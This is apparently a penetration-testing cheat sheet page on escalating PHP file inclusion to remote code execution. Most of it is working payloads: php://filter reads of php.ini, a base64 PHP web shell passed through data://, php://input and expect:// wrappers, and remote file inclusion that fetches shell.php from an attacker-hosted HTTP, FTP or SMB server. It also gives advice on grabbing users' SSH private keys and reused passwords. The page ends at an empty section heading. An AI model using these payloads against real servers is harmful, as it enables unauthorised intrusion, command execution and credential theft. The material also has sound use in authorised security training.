---
layout: default
title: File Inclusion
permalink: /Web/RCE/
---

# Remote Code Execution
One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session.
- We may find the database password in a file like `config.php`, which may match a user's password in case they re-use the same password.
- We can check the `.ssh` directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key `id_rsa` and use it to SSH into the system.
- There are ways to achieve remote code execution directly through vulnerable functions.

## Wrappers
### Data Wrapper
However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations. 
<b>Checking:
We can include the PHP configuration file found at (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version.

```
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
Then:
```
echo '<base64_encoded_string>' | base64 -d | grep allow_url_include
```
Remote Code Execution:
```
echo '<?php system($_GET["cmd"]); ?>' | base64
```
Then in the url bar:
```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<base64_encoded_command>
```
Or use curl:
```
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```
### Input Wrapper
- We pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work.
- The input wrapper also depends on the `allow_url_include` setting, as mentioned previously.
```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
*Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <\?php system('id')?>)*

### Expect Wrapper
Expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server.
<br>Checking is similar as previously:
```
echo '<base64_encoded_string>' | base64 -d | grep expect
```
We may find that a configuraion keyword is used to enable the except module. Then:
```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

## Remote File Inclusion (RFI)
This allows two main benefits:
- Enumerating local-only ports and web applications (i.e. SSRF).
- Gaining remote code execution by including a malicious script that we host.

Some of the functions that (if vulnerable) would allow RFI:
1. PHP
   - include()/include_once()
   - file_get_contents()
2. Java
   - import
3. .NET
   - @Html.RemotePartial()
   - include

### Verify RFI
- Any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled (see earlier).
- A more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content. At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (http://127.0.0.1:80/index.php) as our input string and see if it gets included:
  `http://<SERVER_IP>:<PORT>/index.php?<param>=http://127.0.0.1:80/index.php`<br>
  Furthermore, this could show us that the index.php page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.
  *Note: It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.*

### RCE with RFI
#### HTTP
The first step in gaining remote code execution is creating a malicious script in the language of the web application. We can use a custom web shell we download from the internet. <br>
Example:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server <LISTENING_PORT>
```
Then visit `http://<SERVER_IP>:<PORT>/index.php?<param>=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`.
*Note: We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload*

#### FTP
This may also be useful in case http ports are blocked by a firewall or the http:// string gets blocked by a WAF.
```
sudo python -m pyftpdlib -p 21
```
Then visit `http://<SERVER_IP>:<PORT>/index.php?<param>=ftp://<OUR_IP>/shell.php&cmd=id`.

#### SMB
If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

```
impacket-smbserver -smb2support share $(pwd)
```
Then visit `http://<SERVER_IP>:<PORT>/index.php?<param>=\\<OUR_IP>\share\shell.php&cmd=whoami`
<br>*Note: we must note that this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default*

### LFI and File Uploads

